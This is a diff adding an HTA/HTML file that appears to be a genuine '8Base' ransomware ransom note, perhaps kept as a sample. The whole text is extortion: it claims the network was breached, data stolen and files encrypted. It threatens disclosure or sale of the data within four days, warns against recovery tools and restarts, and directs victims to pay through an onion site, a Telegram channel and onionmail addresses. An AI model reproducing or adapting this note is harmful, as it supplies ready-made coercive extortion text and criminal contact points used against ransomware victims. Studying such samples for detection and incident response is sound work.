@@ -1,0 +1,192 @@
+<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'>
+<html>
+  <head>
+    <meta charset='windows-1251'>
+    <title>encrypted</title>
+
+    <HTA:APPLICATION
+      ICON='msiexec.exe'
+      SINGLEINSTANCE='yes'
+      SysMenu="no">
+
+    <script language='JScript'>
+      window.moveTo(50, 50);
+      window.resizeTo(screen.width - 100, screen.height - 100);
+    </script>
+
+    <style type='text/css'>
+
+      body {
+        font: 15px Tahoma, sans-serif;
+        margin: 10px;
+        line-height: 25px;
+        background: #EDEDED;
+      }
+	  img {
+		display:inline-block;
+	  }
+      .bold {
+        font-weight: bold;
+      }
+      .mark {
+        background: #D0D0E8;
+        padding: 2px 5px;
+      }
+      .header {
+		text-align: center;
+        font-size: 30px;
+        line-height: 50px;
+        font-weight: bold;
+		margin-bottom:20px;
+      }
+	  
+      .info {
+        background: #D0D0E8;
+        border-left: 10px solid #00008B;
+      }
+      .alert {
+        background: #FFE4E4;
+        border-left: 10px solid #FF0000;
+      }
+      .private {
+        border: 1px dashed #000;
+        background: #FFFFEF;
+      }
+
+      .note {
+        height: auto;
+        padding-bottom: 1px;
+        margin: 15px 0;
+      }
+      .note .title {
+        font-weight: bold;
+        text-indent: 10px;
+        height: 30px;
+        line-height: 30px;
+        padding-top: 10px;
+      }
+      .note .mark {
+        background: #A2A2B5;
+      }
+      .note ul {
+        margin-top: 0;
+      }
+      .note pre {
+        margin-left: 15px;
+        line-height: 13px;
+        font-size: 13px;
+      }
+	  .footer {
+		position:fixed;
+		bottom:0;
+		right:0;
+	    text-align: right;
+	  }
+	  .title {
+	    margin-left: 0;
+	  }
+	  .title.sub {
+	    margin-left:30px;
+		dispaly:inline-block;
+	  }
+    </style>
+  </head>
+
+  <body>
+    <div class='header'>
+		<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAQAAAAAYLlVAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfjAwwMJwSFwIn8AAADNklEQVRo3u2ZTUhUURTHfzozmprmZ1pYEmkfJNEmiwwkSEyFECIQpEUboYhqFYHQXlcti9rUKldWBEUiuQpbtDDNzD5G8qM0HRXLRtO5LdJx3puPd++8+xyIztm88zgf/3veufeee18SdimDI1RxnL0U4gbAzxhDdPGCfpZs+49JWTTyFB8iAq8wTju1pDgXvopOliIGX+d57rHPieBuLvLNIvgaD1KvP/x1FiTDCwQTNOkFcJVfCuEFgq+c0he+minF8AJBH2WRnCUph8/nIZVhb2d5w1smEbjYSTn7SQ/TucsFlnWkPxBW6Xc4RkbIoHKooSNshsxRbT98Eb0mtyM04oqgmR6hUNvtrwrnWDa4nOVMVF0XLfw2aPuosBfezQPTmNpiVtFmnpj0W+wBKMFrcPeJ3RYWNfwwWHSSZgdAHX6Du5uWFpl0myqm1KiQrASgnNQQaZFOS4t5nhvkAnbZAbDHIE0wIGHzmsUQKdXkQwlACtsN8ijfJay8zBjkovgBbCLPlAG/hNUcswa5IH4Ayasdzxr5pBbWRRYMstGHYg04QAkH4FbQFSwTCKbdI7mzWVipbMceKtiCCFqO0OeY1caRbAaKOcgOCpQ+WWTyM8EwvfjkTfJoYZDFONqwaPyTHs7LbktlPNMYep2XuE22dfhsHjkS/i+3Wn/SK2EdoE72UeuyGH8rxbbLLjqlkRlb4TAzDo5fIJiOvRTnR+ju9VJuwveC/wASDsD+2h5KUyyQTVZiALzjFt3MsY16mtmqx2mt9BbUw4EQuzpGpVcCLQB8nDBZXmJFDoCeInzFS9ObxwzLmeoBMGA4/QBM4t1IAOHXDi7Zqwg9ACrCWotS8xnQWQCHOGsafzOFOhzLT8NxmoI3RZncULjG1ARA8DHYupxUucbUtxd4ghnw4JI30wdARHneMABx0j8FYD3xCkdefQByKFl9KsOjy6nKNBR0cZRCTjOk1JhrBCCY5r3pZtSS9bZkueSqmljVgPoPDa0Algk4HD8QG8AXph0G8Dk2AC89DgPosFKodvR83G/dtiRzTevtUChP0SCTpBQuM+bI6Bvk51gl96X/FFvzCh9oW0v+H2zO2tYtz/EgAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAzLTEyVDEyOjM5OjA0KzAwOjAwG6lIYwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMy0xMlQxMjozOTowNCswMDowMGr08N8AAAAASUVORK5CYII='>
+		<div>Dear Management</div>
+	</div>
+
+    <div class='bold'>&nbsp;&nbsp;&nbsp;If you are reading this message, it means that:<br><ul>
+    	  - your network infrastructure has been compromised,<br> 
+          - critical data was leaked,<br> 
+          - files are encrypted</span></div></ul>
+	<div class='bold'>&nbsp;&nbsp;&nbsp;The best and only thing you can do is to contact us to settle the matter before any losses occurs.</span></div>
+	<div class='bold'>&nbsp;&nbsp;&nbsp;Onion site: <span class='mark'><a href='http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqb4nx6cmod3emy7sad.onion'>http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqb4nx6cmod3emy7sad.onion</a></span></div>
+	<div class='bold'>&nbsp;&nbsp;&nbsp;Telegram channel: <span class='mark'><a href='https://t.me/eightbase'>https://t.me/eightbase</a></span></div>
+    
+	</div>
+	
+	<div class='note info'>
+      <div class='title'>1. THE FOLLOWING IS STRICTLY FORBIDDEN</div>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;1.1 EDITING FILES ON HDD.</div>
+		<ul>Renaming, copying or moving any files could DAMAGE the cipher and decryption will be impossible.</ul>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;1.2 USING THIRD-PARTY SOFTWARE.</div>
+		<ul>Trying to recover with any software can also break the cipher and file recovery will become a problem.</ul>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;1.3 SHUTDOWN OR RESTART THE PC.</div>
+		<ul>Boot and recovery errors can also damage the cipher. Sorry about that, but doing so is entirely at your own risk.</ul>
+    </div>
+	
+	<div class='note info'>
+      <div class='title'>2. EXPLANATION OF THE SITUATION</div>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;2.1 HOW DID THIS HAPPEN</div>
+		<ul>The security of your IT perimeter has been compromised (it's not perfect at all). 
+We encrypted your workstations and servers to make the fact of the intrusion visible and to prevent you from hiding critical data leaks.
+We spent a lot of time researching and finding out the most important directories of your business, your weak points. 
+We have already downloaded a huge amount of critical data and analyzed it. Now its fate is up to you, it will either be deleted or sold, or shared with the media.</ul>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;2.2 VALUABLE DATA WE USUALLY STEAL:</div>
+		<ul>- Databases, legal documents, personal information.<br>
+                            - Audit reports.<br>
+                            - Audit SQL database.<br>
+                            - Any financial documents (Statements, invoices, accounting, transfers etc.).<br>
+                            - Work files and corporate correspondence.<br>
+                            - Any backups.<br>
+			                - Confidential documents.</ul>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;2.3 TO DO LIST (best practies)</div>
+		<ul>- Contact us as soon as possible.
+                            - Contact us only in our live chat, otherwise you can run into scammers.
+                            - Purchase our decryption tool and decrypt your files. There is no other way to do this.
+                            - Realize that dealing with us is the shortest way to success and secrecy.
+                            - Give up the idea of using decryption help programs, otherwise you will destroy the system permanently.
+                            - Avoid any third-party negotiators and recovery groups. They can become the source of leaks.</ul>
+    </div>
+    <div class='note info'>
+      <div class='title'>3. POSSIBLE DECISIONS</div>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;3.1 NOT MAKING THE DEAL</div>
+		<ul>- After 4 days starting tomorrow your leaked data will be Disclosed or sold.<br>
+                            - We will also send the data to all interested supervisory organizations and the media.<br>
+                            - Decryption key will be deleted permanently and recovery will be impossible.<br>
+                            - Losses from the situation can be measured based on your annual budget.</ul>
+	<div class='title.sub'>&nbsp;&nbsp;&nbsp;3.2 MAKING THE WIN-WIN DEAL</div>
+		<ul>- Databases, legal documents, personal information.<br>
+                            - You will get the only working Decryption Tool and the how-to-use Manual.<br> 
+                            - You will get our guarantees (with log provided) of non-recovarable deletion of all your leaked data.<br>
+                            - You will get our guarantees of secrecy and removal of all traces related to the deal in the Internet.<br> 
+                            - You will get our security report on how to fix your security breaches.</ul>
+	</div>
+	</div>
+    <div class='note info'>
+      <div class='title'>4. EVIDENCE OF THE LEAKAGE</div>
+	  <div class='bold'>&nbsp;&nbsp;&nbsp;In our contact form or mail:</span></div>
+	<div class='bold'>&nbsp;&nbsp;&nbsp;Onion site: <span class='mark'><a href='http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqb4nx6cmod3emy7sad.onion'>http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqb4nx6cmod3emy7sad.onion</a></span></div>
+    <ul>
+		<li>Write us to the mails: <span class='mark'>recovery8files@onionmail.org</span></li> or <span class='mark'>8filesback@onionmail.org</span>
+		<li>Write this ID in the title of your message <span class='mark'>65E82ABF-3483</span></li>
+        
+    </ul>	
+	</div>
+	</div>
+    <div class='note info'>
+      <div class='title'>5. HOW TO CONTACT US</div>
+	<ul>
+		5.1 Download and install TOR Browser <a href='https://torproject.org'>https://torproject.org</a><br>
+		5.2 Go to our contact form website at <a href='http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqb4nx6cmod3emy7sad.onion'>http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqb4nx6cmod3emy7sad.onion</a><br>
+        5.3 You can request sample files chat to review leaked data samples.<br>
+        5.4 In case TOR Browser is restricted in your area use VPN services.<br>
+		5.5 All leaked Data samples will be Disclosed in 4 Days if you remain silent.<br>
+		5.6 Your Decryption keys will be permanently destroyed at the moment the leaked Data is Disclosed.
+        </ul>	
+	</div>
+
+    <div class='note alert'>
+      <div class='title'>6. RESPONSIBILITY</div>
+	  <div class='title.sub'>&nbsp;&nbsp;&nbsp;6.1 Breaking critical points of this offer will cause:</div>
+      <ul>
+        <li>Deletion of your decryption keys.</li>
+        <li>Immediate sale or complete Disclosure of your leaked data.</li>
+        <li>Notification of government supervision agencies, your competitors and clients.</li>
+      </ul>
+	</div>
+  </body>
+</html>
